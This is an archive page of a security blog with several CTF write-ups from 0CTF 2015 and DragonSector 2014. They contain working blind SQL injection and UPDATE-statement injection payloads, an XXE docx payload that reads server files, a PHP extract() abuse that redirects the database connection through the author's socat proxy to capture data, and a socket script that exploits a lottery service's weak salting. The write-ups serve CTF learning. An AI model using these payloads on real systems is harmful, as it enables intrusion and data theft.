

<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">

    <title>&lt;/pwntester&gt; - Page 2</title>
    <meta name="description" content="">

    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <link rel="shortcut icon" href="../../assets/favicon.png?v=d47df0f104">

    <link rel="stylesheet" type="text/css" href="../../assets/css/screen.css?v=d47df0f104">
    <link href="http://fonts.googleapis.com/css?family=Open+Sans:400,700" rel="stylesheet" type="text/css">
    <link href="http://fonts.googleapis.com/css?family=Roboto" rel="stylesheet" type="text/css">

    <script type="text/javascript" src="../../assets/js/jquery-1.11.1.min.js?v=d47df0f104"></script>
    <script type="text/javascript" src="../../assets/js/jquery.fitvids.js?v=d47df0f104"></script>
    <script type="text/javascript" src="../../assets/js/moment.js?v=d47df0f104"></script>
    <script type="text/javascript" src="../../assets/js/handlebars.js?v=d47df0f104"></script>
    <script type="text/javascript" src="../../assets/js/jquery.tapirus.js?v=d47df0f104"></script> 
    <script type="text/javascript" src="../../assets/js/index.js?v=d47df0f104"></script>


    <link rel="canonical" href="http://www.pwntester.com/page/2/">
    <meta name="referrer" content="no-referrer-when-downgrade">
    <link rel="prev" href="http://www.pwntester.com/">
    <link rel="next" href="http://www.pwntester.com/page/3/">
    <meta name="generator" content="Ghost 0.11">
    <link rel="alternate" type="application/rss+xml" title="&lt;/pwntester&gt;" href="http://www.pwntester.com/rss/">

    <link href="http://netdna.bootstrapcdn.com/font-awesome/4.0.3/css/font-awesome.css" rel="stylesheet">

    <link rel="stylesheet" type="text/css" href="../../assets/css/prism.css?v=d47df0f104">

    <script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');

  ga('create', 'UA-49973078-2', 'pwntester.com');
  ga('send', 'pageview');

</script></head>

<body class="paged archive-template">

    <div id="sidebar">
        <div id="sidebar-content" class="inner">
            <a class="blog-logo" href="http://www.pwntester.com"><img src="../../content/images/2014/May/rooted.jpeg" alt="Blog Logo"></a>
            <h2 class="blog-title"><a href="http://www.pwntester.com">&lt;/pwntester&gt;</a>
            <h3 class="blog-description"></h3></h2>

            <!--form id="search">
                <input id="search-field" placeholder="Search"/>
            </form-->
            <form id="search">  
                <input id="search-field" type="search" placeholder="Search">
            </form>  

            <div id="sidebar-links">
                <ul id="subscription-links">
                    <li><a target="_blank" href="http://www.pwntester.com/rss/"><i class="fa fa-rss"></i> Subscribe via RSS</a></li>
                    <!-- No support yet
                    <li><a target="_blank" href=" "><i class="fa fa-envelope"></i> Subscribe via email<a></li>
                    -->
                </ul>
                <ul id="sidebar-internal">
                    <!-- For 'About' and other pages -->
                </ul>
                <ul id="sidebar-external">
                    <li class="external-link"><a href="https://github.com/pwntester"><i class="fa fa-github"></i> GitHub</a></li>
<li class="external-link"><a href="http://www.linkedin.com/in/alvaroms"><i class="fa fa-linkedin"></i> LinkedIn</a></li>
<li class="external-link"><a href="https://twitter.com/pwntester"><i class="fa fa-twitter"></i> Twitter</a></li>
<li class="external-link"><a target="_blank" href="mailto:alvaro@pwntester.com"><i class="fa fa-envelope"></i> Contact</a></li>
                </ul>
            </div>

            <footer class="site-footer">
                <section class="copyright">© 2017 <a href="mailto:alvaro@pwntester.com">Alvaro Muñoz</a> • All rights reserved.</section>
            </footer>
        </div>
    </div>

    <main>
        <section id="results"></section>
        


<article class="post">
    <header class="post-header">
        <span class="post-meta"><time datetime="2015-03-30">30 Mar 2015</time> </span>
        <h1 class="post-title"><a href="../../blog/2015/03/30/0ctf-2015-golden-mac-2-web-300/">0CTF 2015 - Golden Mac 2 (web 300)</a></h1>
    </header>
    <section class="post-content">
        <p>While playing <a href="http://www.pwntester.com/blog/2015/03/30/0ctf-2015-golden-mac-1-web-300/">Golden Mac 1</a> I found the <code>./bash_history</code> for user <code>salt</code> that looked like:</p>

<pre><code class="language-lang-raw">whoami  
pwd  
ls  
sudo nmap -sS 202.112.26.1/24 -p 22,80,3306  
curl http://202.112.26.103/secret_blog/?id=1  
msfconsole  
curl https://twitter.com/_SaxX_/status/580376290525650944  
python -c "exec ''.join([chr(ord(i)^0x46) for i in '/+6)42f)5}f)5h5?52#+nd4+fk4 f8ido'])"&lt;br /&gt;  
shit!  
exit  
</code></pre>

<p>While the SaxX tweet was funny, the <code>secret_blog</code> looked promising. The IP was not accessible from the outside but we could leverage our XXE injection into a SSRF vulnerability and visit the blog. Using the XXE injection in the docx document, you can visit <code>http://202.112.26.103/secret_blog/?id=1</code> and get <code>You do not have permission to access this post!</code> <br>
Other interesting results were:</p>

<pre><code class="language-lang-raw">http://202.112.26.103/secret_blog/?id=1  
You do not have permission to access this post!

http://202.112.26.103/secret_blog/?id=0  
Please specify an id :)

http://202.112.26.103/secret_blog/?id=2  
You do not have permission to access this post!

http://202.112.26.103/secret_blog/?id=3  
Post not exists!  
</code></pre>

<p>Also:  </p>

<pre><code class="language-lang-raw">http://202.112.26.103/secret_blog/?id=1 order by 1  
You do not have permission to access this post!  
</code></pre>

<p>Cool! so it seems it is vulnerable to blind SQL injection.</p>

<p>Further steps:  </p>

<pre><code class="language-lang-raw">http://202.112.26.103/secret_blog/?id=1 or id=(select 1)  
You do not have permission to access this post!

http://202.112.26.103/secret_blog/?id=1 or id=(select notexisting from nowhere)  
500 Internal error

http://202.112.26.103/secret_blog/?id=1 or id=(select flag from flag)  
You do not have permission to access this post!  
YAY!!  
</code></pre>

<p>At this point it was a matter of running a blind sql injection attack to extract the flag.</p>

<p>True statements:  </p>

<pre><code class="language-lang-raw">http://202.112.26.103/secret_blog/?id=1 and true  
You do not have permission to access this post!  
</code></pre>

<p>False statements:  </p>

<pre><code class="language-lang-raw">http://202.112.26.103/secret_blog/?id=1 and false  
Post not exists!  
</code></pre>

<p>We get the flag using binary search with regular expressions like:</p>

<pre><code class="language-lang-raw">http://202.112.26.103/secret_blog/?id=1 and ((select flag from flag) regexp binary '^%s' = 1)  
</code></pre>

<p>FLAG: <code>0ctf{you_good_pentester_finally_find_me}</code></p>
    </section>
    <footer class="post-indexfooter">
        <i class="fa fa-comments"></i> <a href="../../blog/2015/03/30/0ctf-2015-golden-mac-2-web-300/index.html#disqus_thread">Comments</a>
    </footer>
</article>


<article class="post">
    <header class="post-header">
        <span class="post-meta"><time datetime="2015-03-30">30 Mar 2015</time> </span>
        <h1 class="post-title"><a href="../../blog/2015/03/30/0ctf-2015-x-y-z/">0CTF 2015 - X-Y-Z (misc 300)</a></h1>
    </header>
    <section class="post-content">
        <p>We are given thousands of 3D coordinates in a text file:  </p>

<pre><code class="language-lang-raw">-4.751373,-2.622809,2.428588;-4.435134,-3.046589,2.406030;-4.788052,-2.661979,2.464709
-4.692748,-2.599611,2.629112;-4.656070,-2.560445,2.592991;-4.788052,-2.661979,2.464709
-4.692748,-2.599611,2.629112;-4.788052,-2.661979,2.464709;-4.435134,-3.046589,2.406030
-4.656070,-2.560445,2.592991;-4.516017,-2.714652,2.570303;-4.751373,-2.622809,2.428588
-4.656070,-2.560445,2.592991;-4.751373,-2.622809,2.428588;-4.788052,-2.661979,2.464709
-4.611258,-2.777269,2.405960;-4.435134,-3.046589,2.406030;-4.751373,-2.622809,2.428588
-4.572725,-2.644557,2.333280;-4.603014,-2.680354,2.364417;-4.592222,-2.663824,2.351891
-4.571442,-2.773632,2.381504;-4.564917,-2.826000,2.397583;-4.611258,-2.777269,2.405960
-4.571436,-2.742115,2.369542;-4.571442,-2.773632,2.381504;-4.611258,-2.777269,2.405960
-4.571436,-2.742115,2.369542;-4.611258,-2.777269,2.405960;-4.567214,-2.723559,2.360054
-4.567214,-2.723559,2.360054;-4.611258,-2.777269,2.405960;-4.560604,-2.711404,2.351613
-4.564917,-2.826000,2.397583;-4.435134,-3.046589,2.406030;-4.611258,-2.777269,2.405960
-4.560604,-2.711404,2.351613;-4.611258,-2.777269,2.405960;-4.614635,-2.748184,2.396883
...
...
</code></pre>

<p>If we represent them with <code>matplotlib</code> using somrthing like:  </p>

<pre><code class="language-lang-python line-numbers">from matplotlib import pyplot  
import pylab  
from mpl_toolkits.mplot3d import Axes3D

x_vals = []  
y_vals = []  
z_vals = []

data = open("x-y-z", "r").readlines()  
i = 0  
for line in data:  
    points = line.split(";")
    for point in points:
        point = point.replace("\r\n","").split(",")
        i += 1
        x = float(point[0])
        y = float(point[1])
        z = float(point[2])
        if i % 1 == 0:
            if (y//x) &lt; 1.1 and (y//x) &lt; 0.9:
                x_vals.append(x)
                y_vals.append(y)
                z_vals.append(z)

print len(x_vals)  
fig = pylab.figure()  
ax = Axes3D(fig)  
ax.scatter(x_vals, y_vals, z_vals, zdir=u'z', s=1, c=u'blue', depthshade=False)  
pyplot.show()  
</code></pre>

<p>We get a nice 3D flag that we need to rotate, zoom and waste our eyes to finally get the flag.</p>

<p><img src="../../content/images/2015/Mar/Screen-Shot-2015-03-30-at-19-34-20.png" alt=""></p>

<p>FLAG: <code>0ctf{0ur_Flag_L00ks_Great_in_Three_D}</code> (Thanks Mathias)</p>
    </section>
    <footer class="post-indexfooter">
        <i class="fa fa-comments"></i> <a href="../../blog/2015/03/30/0ctf-2015-x-y-z/index.html#disqus_thread">Comments</a>
    </footer>
</article>


<article class="post">
    <header class="post-header">
        <span class="post-meta"><time datetime="2015-03-30">30 Mar 2015</time> </span>
        <h1 class="post-title"><a href="../../blog/2015/03/30/0ctf-2015-golden-mac-1-web-300/">0CTF 2015 - Golden Mac 1 (web 300)</a></h1>
    </header>
    <section class="post-content">
        <p><img src="../../content/images/2015/Mar/Screen-Shot-2015-03-30-at-15-58-48.png" alt="Home">
In the description and task title, it states that the developer uses a Mac Book Pro. So we looked for the <code>.DS_Store</code> in the application root directory and found one whose contents we can read with this simple python script:</p>

<pre><code class="language-lang-python line-numbers">from ds_store import DSStore  
with DSStore.open('DS_Store', 'r+') as d:  
    for i in d:
        print i
</code></pre>

<p>Output:</p>

<pre><code class="language-lang-raw">&lt;index.php Iloc&gt;  
&lt;parse.class.php Iloc&gt;  
&lt;u_can_not_guess_this_haha.php Iloc&gt;  
</code></pre>

<p>It seems the flag is in <code>u_can_not_guess_this_haha.php</code> but the page renders an empty page. Probably flag is in the code.</p>

<p>The site lets us upload an image and a document. There is no control of the file type nor the extension for the image so we can upload any file to <code>/uploads</code> but that doesnt turn out to be very useful.</p>

<p>We can also upload profile descriptions in <code>docx</code> format which is basically a bunch of XML docs zipped. It turns out the application process the XML files without disabling external entities and so its vulnerable to XXE. We prepared a specially crafted docx document to retrieve the <code>u_can_not_guess_this_haha.php</code> file in base64 format (so we have no problems with <code>&lt;&gt;</code> characters:</p>

<pre><code class="language-lang-raw">&lt;?xml version="1.0" encoding="UTF-8" standalone="yes"?&gt;  
&lt;!DOCTYPE document [&lt;!ENTITY xxx SYSTEM "php://filter/read=convert.base64-encode/resource=u_can_not_guess_this_haha.php"&gt;]&gt;  
&lt;w:document&gt; ... &lt;/w:document&gt;  
</code></pre>

<p>Output:  </p>

<pre><code class="language-lang-raw">PD9waHAgLy9mbGFnIDBjdGZ7eTB1X2ZpbmRfbTNfQmFkX2d1WX0=&lt;br /&gt;  
</code></pre>

<p>FLAG is: <code>0ctf{y0u_find_m3_Bad_guY}</code></p>
    </section>
    <footer class="post-indexfooter">
        <i class="fa fa-comments"></i> <a href="../../blog/2015/03/30/0ctf-2015-golden-mac-1-web-300/index.html#disqus_thread">Comments</a>
    </footer>
</article>


<article class="post">
    <header class="post-header">
        <span class="post-meta"><time datetime="2015-03-30">30 Mar 2015</time> </span>
        <h1 class="post-title"><a href="../../blog/2015/03/30/lily-web-200/">0CTF 2015 - Lily (web 200)</a></h1>
    </header>
    <section class="post-content">
        <p>A simple web where we can register and login in. Once logged in, we can change our password. <br>
The home page shows a message from <code>Tales from two cities</code> and the email we used for log in.</p>

<p>There is a SQL injection affecting the <code>UPDATE</code> statement sent with the <code>Modify password</code> feature. The idea is to modify the statement to change also the email (that we can read in the home page):</p>

<pre><code class="language-lang-raw">POST /modify HTTP/1.1  
Host: 202.112.26.104:5000  
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:36.0) Gecko/20100101 Firefox/36.0  
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8  
Accept-Language: en-US,es-ES;q=0.8,es;q=0.5,en;q=0.3  
Accept-Encoding: gzip, deflate  
Referer: http://202.112.26.104:5000/modify  
Cookie: session=.eJyrVopPy0kszkgtVrKKrlZSKIFQSUpWSknhYVXJRm55UYG2tkq1OlDR8HBLQ0-PlJzk3ND0JHfLvCijsGxPd0vDFEeQqliwOjINySkFGRCro5STn56emhKfmadkVVJUmqqjVFqcWpSXmJsK1FpQnpdaZGigVAsAq0Q6FQ.B_iyaw.haWh_kdtJXPqgs1n__YSVID6vlY  
Connection: keep-alive  
Content-Type: application/x-www-form-urlencoded  
Content-Length: 65

password=0ewr1pn',email=(SELECT flag from flag),password='0ewr1pn  
</code></pre>

<p><img src="../../content/images/2015/Mar/Screen-Shot-2015-03-30-at-15-55-53.png" alt="Flag"></p>

<p>FLAG is <code>0CTF{R0t_?_S8rRy_1_doNt_N}</code></p>
    </section>
    <footer class="post-indexfooter">
        <i class="fa fa-comments"></i> <a href="../../blog/2015/03/30/lily-web-200/index.html#disqus_thread">Comments</a>
    </footer>
</article>


<article class="post">
    <header class="post-header">
        <span class="post-meta"><time datetime="2015-03-30">30 Mar 2015</time> </span>
        <h1 class="post-title"><a href="../../blog/2015/03/30/0ctf-short-write-ups/">0CTF 2015 - Forward (web 250)</a></h1>
    </header>
    <section class="post-content">
        <p>We are given access to a page and its source code:  </p>

<pre><code class="language-lang-php line-numbers">&lt;?php  
    if (isset($_GET['view-source'])) {
        show_source(__FILE__);
        exit();
    }
    include("./inc.php"); // key &amp; database config
    function err($str){ die("&lt;script&gt;alert(\"$str\");window.location.href='./';&lt;/script&gt;"); }
    $nonce = mt_rand();
    extract($_GET); // this is my backdoor :)
    if (empty($_POST['key'])) {
        err("Parameter Missing!");
    }
    if ($_POST['key'] !== $key) {
        err("You Are Not Authorized!");
    }
    $conn = mysql_connect($host, $user, $pass);
    if (!$conn) {
        err("Database Error, Please Contact with GameMaster!");
    }
    $query = isset($_POST['query']) ? bin2hex($_POST['query']) : "SELECT flag FROM forward.flag";
    $res = mysql_query($query);
    if (FALSE == $res) {
        err("Database Error, Please Contact with GameMaster!");
    }
    $row = mysql_fetch_array($res);
    if ($debug) {
        echo "HOST:\t{$host}&lt;br/&gt;";
        echo "USER:\t{$user}&lt;br/&gt;";
    }
    echo "&lt;del&gt;FLAG:\t0ctf{&lt;/del&gt;" . sha1($nonce . md5($row['flag'])) . "&lt;del&gt;}&lt;/del&gt;&lt;br/&gt;"; // not real flag
    mysql_close($conn);

?&gt;
</code></pre>

<p>We can inject any variable because of the <code>extract($_GET);</code> as long as it is not later overwritten. Thats usefule to bypass the <code>key</code> check and to get the <code>host</code> name and <code>user</code> using the <code>debug</code> mode:</p>

<p>Request:  </p>

<pre><code class="language-lang-raw">POST /admin.php?key=NOKEY&amp;debug=1 HTTP/1.1  
Host: 202.112.28.121  
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:36.0) Gecko/20100101 Firefox/36.0  
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8  
Accept-Language: en-US,es-ES;q=0.8,es;q=0.5,en;q=0.3  
Accept-Encoding: gzip, deflate  
Referer: http://202.112.28.121/  
Connection: keep-alive  
Content-Type: application/x-www-form-urlencoded  
Content-Length: 9

key=NOKEY  
</code></pre>

<p>Response:  </p>

<pre><code class="language-lang-raw">HTTP/1.1 200 OK  
Date: Sun, 29 Mar 2015 22:57:20 GMT  
Server: Apache/2.4.7 (Ubuntu)  
X-Powered-By: PHP/5.5.9-1ubuntu4.7  
Vary: Accept-Encoding  
Content-Length: 123  
Keep-Alive: timeout=5, max=100  
Connection: Keep-Alive  
Content-Type: text/html

HOST:    162.243.129.228&lt;br/&gt;USER:   forward&lt;br/&gt;&lt;del&gt;FLAG:  0ctf{&lt;/del&gt;cd8b8ddac686f4ead123786fead8f9476e975b17&lt;del&gt;}&lt;/del&gt;&lt;br/&gt;  
</code></pre>

<p>We can check that the server is allowing mysql connections on default port (3306) so what we can do is set up a proxy in our machine to receive the DB connection and <code>forward</code> it to the real DB server. We use <code>socat</code> for that:</p>

<pre><code class="language-lang-bash">root@www:~# socat -v TCP-LISTEN:3306 TCP:202.112.28.121:3306  
</code></pre>

<p>Now, we can force the connection to go through our server and watch the traffic (query results == flag) going through the proxy:</p>

<pre><code class="language-lang-raw">POST /admin.php?key=NOKEY&amp;debug=1&amp;nonce=&amp;host=xxx.yyy.zzz.www HTTP/1.1  
</code></pre>

<p>Intercepted traffic:  </p>

<pre><code class="language-lang-bash">root@www:~# socat -v TCP-LISTEN:3306 TCP:202.112.28.121:3306  
&lt; 2015/03/29 22:57:33.303951  length=95 from=0 to=94  
[...
5.5.41-0ubuntu0.14.04.1.fo\v.\\2%bA]0t...\b...............z)Zi"hgL)''-.mysql_native_password.&gt; 2015/03/29 22:57:33.527793  length=87 from=0 to=86  
S..........@\b.......................forward......U..l.._....X....mysql_native_password.&lt; 2015/03/29 22:57:33.739001  length=11 from=95 to=105  
\a..........&gt; 2015/03/29 22:57:33.963015  length=7 from=87 to=93
.......&lt; 2015/03/29 22:57:34.174384  length=9 from=106 to=114
.........&gt; 2015/03/29 22:57:34.398563  length=34 from=94 to=127
.....SELECT flag FROM forward.flag&lt; 2015/03/29 22:57:34.610552  length=96 from=115 to=210
.....-....def\aforward.flag.flag.flag.flag\f\b.0................"......0ctf{w3ll_d0ne_guY}.......".&gt; 2015/03/29 22:57:34.834863  length=5 from=128 to=132
.....root@www:~#
</code></pre>

<p>FLAG is <code>0ctf{w3ll_d0ne_guY}</code></p>
    </section>
    <footer class="post-indexfooter">
        <i class="fa fa-comments"></i> <a href="../../blog/2015/03/30/0ctf-short-write-ups/index.html#disqus_thread">Comments</a>
    </footer>
</article>


<article class="post tag-crypto">
    <header class="post-header">
        <span class="post-meta"><time datetime="2014-04-27">27 Apr 2014</time> on <a href="../../tag/crypto/">Crypto</a></span>
        <h1 class="post-title"><a href="../../blog/2014/04/27/dragonsector-crypto-100/">DragonSector Crypto 100</a></h1>
    </header>
    <section class="post-content">
        <p>In this task we have to win a lottery game:</p>

<p><img src="../../content/images/octopress/dsctf-crypto24.png" alt=""></p>

<p>Basically each coupon costs $5 and we have $100 to spend. If we try to withdraw our money we get the amount of money we need to get our flag:</p>

<p><img src="../../content/images/octopress/dsctf-crypto25.png" alt=""></p>

<p>To show they are playing fairly, the give you a verification id that its the value you have to guess concatenated with a random salt to reach the AES 16 bytes block that is used to encrypt the string. So we get:</p>

<p><code>AES(&lt;number to guess&gt;#random_salt, ECB_MODE)</code></p>

<p>We are also given the source code where we can verify this:</p>

<pre><code class="language-lang-python line-numbers">from Crypto.Cipher import AES  
from Crypto import Random  
from datetime import datetime  
import random  
import os  
import time  
import sys

flag = open('flag.txt').read()

# config
start_money = 100  
cost = 5     # coupon price  
reward = 100 # reward for winning  
maxNumber = 1000 # we're drawing from 1 to maxNumber  
screenWidth = 79

intro = [  
    '',
    'Welcome to our Lotto!',
    'Bid for $%d, win $%d!' % (cost, reward),
    'Our system is provably fair:',
    '   Before each bid you\'ll receive encrypted result',
    '   After the whole game we will reveal the key to you',
    '   Then, you can decrypt results and verify that we haven\'t cheated on you!',
    '    (e.g. by drawing based on your input)',
    ''
    ]

# expand to AES block with random numeric salt
def randomExtend(block):  
    limit = 10**(16-len(block))
    # salt
    rnd = random.randrange(0, limit)
    # mix it even more
    rnd = (rnd ** random.randrange(10, 100)) % limit
    # append it to the block
    return block + ('%0'+str(16-len(block))+'x')%rnd

def play():  
    # print intro
    print '#' * screenWidth
    for line in intro:
        print  ('# %-' + str(screenWidth-4) + 's #') % line
    print '#' * screenWidth
    print ''

    # prepare everything
    money = start_money

    key = Random.new().read(16) # slow, but secure
    aes = AES.new(key, AES.MODE_ECB)

    # main loop
    quit = False
    while money &gt; 0:
        luckyNumber = random.randrange(maxNumber + 1) # fast random should be enough
        salted = str(luckyNumber) + '#'
        salted = randomExtend(salted)

        print 'Your money: $%d' % money
        print 'Round verification: %s' % aes.encrypt(salted).encode('hex')
        print ''
        print 'Your choice:'
        print '\t1. Buy a coupon for $%d' % cost
        print '\t2. Withdraw your money'
        print '\t3. Quit'

        # read user input
        while True:
            input = raw_input().strip()
            if input == '1':
                # play!
                money -= cost
                sys.stdout.write('Your guess (0-%d): ' % maxNumber)
                guess = int(raw_input().strip())
                if guess == luckyNumber:
                    print 'You won $%d!' % reward
                    money += reward
                else:
                    print 'You lost!'
                break
            elif input == '2':
                # withdraw
                if money &gt; 1337:
                    print 'You won! Here\'s your reward:', flag
                else:
                    print 'You cannot withdraw your money until you get $1337!'
                break
            elif input == '3':
                quit = True
                break
            else:
                print 'Unknown command!'

        print 'The lucky number was: %d' % luckyNumber
        if quit:
            break
        print '[enter] to continue...'
        raw_input()

    print 'Verification key:', key.encode('hex')
    if money &lt;= 0:
        print 'You\'ve lost all your money! get out!'

if __name__ == '__main__':  
    play()
</code></pre>

<p>The problem is that we cannot break AES, so we have to outsmart the system in a different way. There are two factors here that can help us with that:</p>

<p>First, the random salt appended to the value to guess is supposed to prevent us from creating a dictionary from Encrypted values to decrypted ones. Since the same value to guess will have many encrypted representations because of the salt appended. So here is the first mistake of the developers. The salt appended to the value to guess is not that random and turns out to be <code>000000000</code> many times because of the way the salt is calculated:</p>

<pre><code class="language-lang-python line-numbers "># expand to AES block with random numeric salt
def randomExtend(block):  
    limit = 10**(16-len(block))
    # salt
    rnd = random.randrange(0, limit)
    # mix it even more
    rnd = (rnd ** random.randrange(10, 100)) % limit
    # append it to the block
    return block + ('%0'+str(16-len(block))+'x')%rnd
</code></pre>

<p><a href="https://twitter.com/gynvael">Gynvael</a> explained after the CTF was over than the reason for this was that:</p>

<p><code>Any number with a 0 as the last digit (i.e. 10% of numbers) rised to a high power will have all 000000000 at end and it gets truncated to % limit characters basically</code></p>

<p>The second factor is to find the way to play for free and I already showed you how to do it in the second screenshot. For each round we are presented with a verification value and after we choose an option, the value chosen is presented so we can verify that they were not cheating (although they dont give you the key so they could be cheating :D). Anyway, the second option, the one that lets us withdraw money works in the same way and so we can use it to know the number associated to an encrypted value.</p>

<p>So with that, we should be able to play and if we dont know the value associated to the encrypted value presented, we can ask for the withdraw process to get the lucky number associated to the crypto value and add them to a Encrypted-number map. If the encrypted value presented is in our map, then we can bet and win $100. Repeating the process can get us more than $1337 in less than 20 minutes</p>

<pre><code class="language-lang-python line-numbers ">import socket

def read_until(s, text):  
  buffer = ""
  while text not in buffer:
    buffer = buffer + s.recv(1)
  return buffer

host = "23.253.207.179"  
port = 10001  
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  
s.connect((host, port))


def play_round(mydict):  
    store = False
    read_until(s,"Your money: $")
    money = int(read_until(s,"\n")[:-1])
    read_until(s,"Round verification: ")
    encrypted = read_until(s,"\n")[:-1]
    if encrypted in mydict:
        guess = mydict[encrypted]
    else:
        guess = None
        store = True
    menu = read_until(s,"Quit\n")
    if guess is not None:
        # Bet
        s.send("1\n")
        read_until(s,"0-1000): ")
        try:
            guess = int(guess)
        except:
            guess = 1
        s.send("{0}\n".format(guess))
    else:
        # Pass
        s.send("2\n")
    response = read_until(s,"The lucky number was: ")
    num = read_until(s,"\n")[:-1]
    if store:
        mydict[encrypted] = num
    if "won" in response:
        print "win, money %d" % money
        print "Guess %s Verification %s LuckyNum %s" % (str(guess), encrypted, num,)
        if money &gt; 1337:
            print money
            num = read_until(s,"\n")[:-1]
            print num
            s.send("\n")
            print read_until(s,"Quit\n")
            s.send("2\n")
            print read_until(s,"\n")
            print read_until(s,"\n")
            print read_until(s,"\n")
            exit()
    if "lost" in response:
        print "WTF"
        exit()

    num = read_until(s,"\n")[:-1]
    s.send("\n")

mydict = {}  
while True:  
    play_round(mydict)
</code></pre>

<p>The result:</p>

<p><img src="../../content/images/octopress/dsctf-crypto26.png" alt=""></p>
    </section>
    <footer class="post-indexfooter">
        <i class="fa fa-comments"></i> <a href="../../blog/2014/04/27/dragonsector-crypto-100/index.html#disqus_thread">Comments</a>
    </footer>
</article>


<nav class="pagination" role="navigation">
        <a class="newer-posts" href="../../"><span aria-hidden="true">←</span> Newer Posts</a>
    <span class="page-number">Page 2 of 14</span>
        <a class="older-posts" href="../3/">Older Posts <span aria-hidden="true">→</span></a>
</nav>

    </main>

    <!-- You can safely delete this line if your theme does not require jQuery -->
<script type="text/javascript" src="https://code.jquery.com/jquery-1.11.3.min.js"></script>

    <script src="../../assets/js/instantclick.min.js?v=d47df0f104" data-no-instant></script>
    <script data-no-instant>InstantClick.init();</script>
    <script data-no-instant>
        InstantClick.on('change', function() {
            prism_markdown();
            Prism.highlightAll();
        });
        InstantClick.init();
    </script>

    <script type="text/javascript">
        /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
        var disqus_shortname = 'pwntester'; // required: replace example with your forum shortname
        /* * * DON'T EDIT BELOW THIS LINE * * */
        (function () {
            var s = document.createElement('script'); s.async = true;
            s.type = 'text/javascript';
            s.src = '//' + disqus_shortname + '.disqus.com/count.js';
            (document.getElementsByTagName('HEAD')[0] || document.getElementsByTagName('BODY')[0]).appendChild(s);
        }());
    </script>

    <script type="text/javascript" src="../../assets/js/prism-loader.js?v=d47df0f104"></script>
    <script type="text/javascript" src="../../assets/js/prism.js?v=d47df0f104"></script>

</body>

